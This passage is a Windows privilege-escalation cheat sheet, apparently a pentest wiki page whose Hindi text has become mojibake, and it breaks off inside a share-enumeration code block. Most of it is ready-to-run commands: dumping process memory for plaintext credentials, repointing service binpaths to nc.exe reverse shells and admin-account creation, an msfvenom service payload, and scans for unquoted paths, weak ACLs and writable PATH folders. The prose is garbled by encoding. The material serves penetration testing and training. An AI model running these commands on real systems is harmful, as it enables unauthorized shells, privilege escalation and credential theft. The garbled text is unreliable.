### рдореЗрдореЛрд░реА рдкрд╛рд╕рд╡рд░реНрдб рдорд╛рдЗрдирд┐рдВрдЧ

рдЖрдк **sysinternals** рд╕реЗ **procdump** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдореЗрдореЛрд░реА рдбрдВрдк рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред FTP рдЬреИрд╕реА рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ **рдореЗрдореЛрд░реА рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рд╣реЛрддреЗ рд╣реИрдВ, рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдкрдврд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### рдЕрд╕реБрд░рдХреНрд╖рд┐рдд GUI рдПрдкреНрд▓рд┐рдХреЗрд╢рди

**рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ CMD рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред**

рдЙрджрд╛рд╣рд░рдг: "Windows Help and Support" (Windows + F1), "command prompt" рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ, "Click to open Command Prompt" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ

## рд╕реЗрд╡рд╛рдПрдВ

рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдЖрдк **sc** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реЗрд╡рд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
```bash
sc qc <service_name>
```
рдпрд╣ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рд╕реНрддрд░ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП _Sysinternals_ рд╕реЗ рдмрд╛рдЗрдирд░реА **accesschk** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
**Translation:**

рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╕реБрдЭрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ "рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛" рдХреНрдпрд╛ рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ XP рдХреЗ рд▓рд┐рдП accesschk.exe рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### рд╕реЗрд╡рд╛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЛ рдпрд╣ рддреНрд░реБрдЯрд┐ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП SSDPSRV рдХреЗ рд╕рд╛рде):

_рд╕рд┐рд╕реНрдЯрдо рддреНрд░реБрдЯрд┐ 1058 рд╣реБрдИ рд╣реИред_\
_рд╕реЗрд╡рд╛ рд╢реБрд░реВ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА, рдпрд╛ рддреЛ рдЗрд╕реЗ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЗрд╕рдХреЗ рд╕рд╛рде рдХреЛрдИ рд╕рдХреНрд╖рдо рдЙрдкрдХрд░рдг рдЬреБрдбрд╝реЗ рд╣реБрдП рдирд╣реАрдВ рд╣реИрдВред_

рдЖрдк рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕реЗрд╡рд╛ upnphost SSDPSRV рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИ рддрд╛рдХрд┐ рдХрд╛рдо рдХрд░реЗ (XP SP1 рдХреЗ рд▓рд┐рдП)**

**рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХрд╛ рдПрдХ рдФрд░ рдЙрдкрд╛рдп** рдпрд╣ рд╣реИ:
```
sc.exe config usosvc start= auto
```
### **рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдкрде рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**

рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЬрд╣рд╛рдБ "рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛" рд╕рдореВрд╣ рдХреЗ рдкрд╛рд╕ рд╕реЗрд╡рд╛ рдкрд░ **SERVICE_ALL_ACCESS** рд╣реИ, рд╕реЗрд╡рд╛ рдХреЗ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдмрд╛рдЗрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред **sc** рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### рдкреБрдирдГ рд╕реЗрд╡рд╛ рдЖрд░рдВрдн рдХрд░реЗрдВ
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
рд╡рд┐рднрд┐рдиреНрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
- **SERVICE_CHANGE_CONFIG**: рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдХрд╛ рдкреБрдирд░реНрд╡рд┐рдиреНрдпрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- **WRITE_DAC**: рдЕрдиреБрдорддрд┐ рдкреБрдирд░реНрд╡рд┐рдиреНрдпрд╛рд╕ рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрджрд▓рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред
- **WRITE_OWNER**: рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдкреНрд░рд╛рдкреНрддрд┐ рдФрд░ рдЕрдиреБрдорддрд┐ рдкреБрдирд░реНрд╡рд┐рдиреНрдпрд╛рд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- **GENERIC_WRITE**: рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрджрд▓рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдорд┐рд▓рддреА рд╣реИред
- **GENERIC_ALL**: рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрджрд▓рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдорд┐рд▓рддреА рд╣реИред

рдЗрд╕ рд╡рдВрд░реБрдкрддрд╛ рдХреА рдЦреЛрдЬ рдФрд░ рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП, _exploit/windows/local/service_permissions_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдХрдордЬреЛрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдмрд╛рдЗрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреЗ рд╕реНрдерд╛рди рдкрд░ **рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ ([**DLL Hijacking**](dll-hijacking.md))**.**\
рдЖрдк **wmic** (system32 рдореЗрдВ рдирд╣реАрдВ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рднреА рдмрд╛рдЗрдирд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИрдВ рдФрд░ **icacls** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
рдЖрдк **sc** рдФрд░ **icacls** рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### рд╕реЗрд╡рд╛рдУрдВ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕рдВрд╢реЛрдзрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░рдХреЗ рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрд░ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **Authenticated Users** рдпрд╛ **NT AUTHORITY\INTERACTIVE** рдХреЗ рдкрд╛рд╕ `FullControl` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВред рдЕрдЧрд░ рд╣рд╛рдВ, рддреЛ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдмрд╛рдЗрдирд░реА рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдмрд╛рдЗрдирд░реА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд╛ рдкрде рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### рд╕реЗрд╡рд╛рдПрдВ рд░рдЬрд┐рд╕реНрдЯреНрд░реА AppendData/AddSubdirectory рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрд░ рдпрд╣ рдЕрдиреБрдорддрд┐ рд╣реИ рддреЛ **рдЖрдк рдЗрд╕рд╕реЗ рдЗрд╕рд╕реЗ рдЙрдк-рд░рдЬрд┐рд╕реНрдЯреНрд░рд┐рдпрд╛рдБ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред Windows рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ **рдХрд┐рд╕реА рднреА рдЕрд╡рдЪреЗрддрди рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### рдЕрди-рдХреЛрдЯреЗрдб рд╕реЗрд╡рд╛ рдкрде

рдпрджрд┐ рдХрд┐рд╕реА рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдХреЛрдб рдХрд╛ рдорд╛рд░реНрдЧ рдЙрджреНрдзрд░рдг рдХреЗ рднреАрддрд░ рдирд╣реАрдВ рд╣реИ, рддреЛ Windows рд╣рд░ рд╕реНрдерд╛рдирд┐рдХ рдЕрдВрдд рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкрде _C:\Program Files\Some Folder\Service.exe_ рдХреЗ рд▓рд┐рдП Windows рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### рд╕рднреА рдЕрди-рдЙрджреНрдзреГрдд рд╕реЗрд╡рд╛ рдкрдереЛрдВ рдХреА рд╕реВрдЪреА, рдЬреЛ рдХрд┐ рд╡рд┐рдВрдбреЛрдЬ рдХреА рдЗрдирдмрд┐рд▓реНрдЯ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдирд╣реАрдВ рд╣реИрдВ:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**рдЖрдк рдЗрд╕ рд╡рдВрд▓рд░рдмрд┐рд▓рд┐рдЯреА рдХреЛ** рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рд╢реЛрдзрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `exploit/windows/local/trusted\_service\_path`
рдЖрдк рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдПрдХ рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдХрд╛рд░реНрд░рд╡рд╛рдИ

Windows рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реЗрд╡рд╛ рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреА рдУрд░ рд╕рдВрдХреЗрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдпрджрд┐ рдпрд╣ рдмрд╛рдЗрдирд░реА рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрдиреАрдп рд╣реИ, рддреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг [рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN) рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред

## рдЕрдиреБрдкреНрд░рдпреЛрдЧ

### рд╕реНрдерд╛рдкрд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ

**рдмрд╛рдЗрдирд░реА рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рд╢рд╛рдпрдж рдЖрдк рдПрдХ рдХреЛ рдЕрдзрд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ) рдФрд░ **рдлрд╝реЛрд▓реНрдбрд░реЛрдВ** рдХреА ([DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ](dll-hijacking.md))ред
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдХреЛрдИ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝ рд╕рдХреЗрдВ рдпрд╛ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдмрд╛рдЗрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдЦрд╛рддреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (schedtasks).

рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдордЬреЛрд░ рдлрд╝реЛрд▓реНрдбрд░/рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЪрд▓рд╛рдПрдВ

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рдЕрдзрд┐рдХ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрд┐рд╕реА рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**\
**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда** рдХреЛ рдкрдврд╝реЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджрд┐рд▓рдЪрд╕реНрдк **рдСрдЯреЛрд░рдиреНрд╕ рд╕реНрдерд╛рдиреЛрдВ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рди рд╕рдХреЗрдВ:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### рдбреНрд░рд╛рдЗрд╡рд░реНрд╕

рд╕рдВрднрд╛рд╡рд┐рдд **рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдЕрдЬреАрдм/рд╡рдВрд╢рд╛рд╣реА** рдбреНрд░рд╛рдЗрд╡рд░реНрд╕ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **PATH рдкрд░ рдореМрдЬреВрдж рдПрдХ рдлреЛрд▓реНрдбрд░ рдореЗрдВ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдПрдХ DLL рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдХреЗ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

PATH рдореЗрдВ рд╕рднреА рдлреЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
рдЗрд╕ рдЬрд╛рдБрдЪ рдХреЛ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ

### рд╕рд╛рдЭрд╛
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
